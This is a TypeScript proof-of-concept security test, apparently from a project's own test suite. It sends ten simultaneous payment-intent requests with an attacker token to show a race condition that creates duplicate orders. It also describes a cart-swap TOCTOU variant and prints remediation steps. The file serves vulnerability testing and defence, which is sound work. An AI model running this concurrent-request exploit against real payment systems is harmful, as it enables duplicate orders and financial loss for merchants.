/**
 * PoC: Payment Race Condition Attack (Double-Spending)
 * 
 * VULNERABILITY: No database locking during payment creation.
 * Multiple simultaneous requests can create duplicate orders.
 * 
 * IMPACT: 
 * - Create multiple orders for same cart
 * - Potential inventory underselling
 * - Revenue loss if combined with partial payment exploit
 * 
 * Run: npx ts-node security-tests/exploit-payment-race-condition.ts
 */

import axios, { AxiosResponse } from 'axios';

// ============================================
// CONFIGURATION
// ============================================
const API_BASE = 'https://api.security-test.site/api/v1';
const TIMEOUT = 30000;

// IMPORTANT: Replace with a REAL valid JWT token
// Get this by logging in and copying the accessToken
const ATTACKER_JWT = 'YOUR_VALID_JWT_TOKEN_HERE';

// ============================================
// HELPER FUNCTIONS
// ============================================
function isHtmlResponse(response: AxiosResponse): boolean {
  const contentType = response.headers['content-type'] || '';
  const data = typeof response.data === 'string' ? response.data : '';
  return contentType.includes('text/html') || data.includes('<!doctype') || data.includes('<html');
}

function isValidApiResponse(response: AxiosResponse): boolean {
  const contentType = response.headers['content-type'] || '';
  return contentType.includes('application/json');
}

const paymentPayload = {
  items: [
    { productId: '507f1f77bcf86cd799439011', quantity: 1 },
    { productId: '507f1f77bcf86cd799439012', quantity: 2 }
  ]
};

async function singlePaymentRequest(requestId: number): Promise<any> {
  try {
    const response = await axios.post(
      `${API_BASE}/payments/create-intent`,
      paymentPayload,
      {
        headers: {
          'Authorization': `Bearer ${ATTACKER_JWT}`,
          'Content-Type': 'application/json',
          'X-Request-ID': `attack-${requestId}`
        },
        timeout: 30000
      }
    );
    
    return {
      success: true,
      requestId,
      orderId: response.data?.data?.orderId,
      paymentIntentId: response.data?.data?.paymentIntentId,
    };
  } catch (error: any) {
    return {
      success: false,
      requestId,
      error: error.response?.data?.message || error.message
    };
  }
}

async function exploitRaceCondition() {
  console.log('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—');
  console.log('â•‘     SECURITY TEST: Payment Race Condition Attack         â•‘');
  console.log('â•‘     (Double-Spending / Duplicate Order Creation)         â•‘');
  console.log('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n');
  
  console.log('âš ï¸  This is for authorized security testing only!\n');
  
  const CONCURRENT_REQUESTS = 10;
  
  console.log(`[1] Sending ${CONCURRENT_REQUESTS} concurrent payment requests...`);
  console.log('    Each request attempts to create order with same items\n');
  
  // Create array of concurrent promises
  const requests = Array.from(
    { length: CONCURRENT_REQUESTS }, 
    (_, i) => singlePaymentRequest(i + 1)
  );
  
  const startTime = Date.now();
  
  // Execute all requests simultaneously
  const results = await Promise.all(requests);
  
  const endTime = Date.now();
  
  console.log(`[2] All requests completed in ${endTime - startTime}ms\n`);
  
  // Analyze results
  const successful = results.filter(r => r.success);
  const failed = results.filter(r => !r.success);
  const uniqueOrderIds = new Set(successful.map(r => r.orderId));
  
  console.log('='.repeat(50));
  console.log('RESULTS:');
  console.log('='.repeat(50));
  console.log(`Total requests sent:     ${CONCURRENT_REQUESTS}`);
  console.log(`Successful:              ${successful.length}`);
  console.log(`Failed:                  ${failed.length}`);
  console.log(`Unique order IDs:        ${uniqueOrderIds.size}`);
  
  if (successful.length > 1) {
    console.log('\nğŸš¨ VULNERABILITY CONFIRMED!');
    console.log(`   Created ${successful.length} orders from same cart!`);
    console.log('\n   Created Order IDs:');
    successful.forEach(r => {
      console.log(`   - Order: ${r.orderId}`);
      console.log(`     PaymentIntent: ${r.paymentIntentId}`);
    });
    
    console.log('\n   IMPACT:');
    console.log('   - Attacker can create multiple unpaid orders');
    console.log('   - Inventory reserved multiple times');
    console.log('   - If attacker pays one order, others may process incorrectly');
    
    console.log('\n   REMEDIATION:');
    console.log('   1. Use database transactions with row locking');
    console.log('   2. Implement idempotency keys');
    console.log('   3. Add mutex/semaphore per user');
    console.log('   4. Check for pending orders before creating new one');
    
    return true;
  }
  
  if (successful.length === 1) {
    console.log('\nâœ… PATCHED: Only one order created');
    console.log('   Race condition protection appears to be working');
  }
  
  if (failed.length > 0) {
    console.log('\nFailed requests (may indicate protection):');
    failed.forEach(r => console.log(`   Request ${r.requestId}: ${r.error}`));
  }
  
  return false;
}

// Advanced attack: Race condition with cart manipulation
async function exploitCartRaceCondition() {
  console.log('\n\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—');
  console.log('â•‘     VARIANT: Cart Modification During Payment            â•‘');
  console.log('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n');
  
  console.log('[1] Attack scenario:');
  console.log('    T0: Start payment for expensive items ($1000)');
  console.log('    T1: Simultaneously clear cart and add cheap items ($10)');
  console.log('    T2: Check which price was charged\n');
  
  // This would require more complex timing, but demonstrates the concept
  console.log('    This attack exploits TOCTOU (Time-of-check to Time-of-use)');
  console.log('    If price is read from cart instead of being locked at checkout,');
  console.log('    attacker may pay less for more items.\n');
  
  console.log('    [Implementation requires actual cart API integration]');
}

async function main() {
  try {
    await exploitRaceCondition();
    await exploitCartRaceCondition();
  } catch (error) {
    console.error('Exploit failed:', error);
  }
}

main();
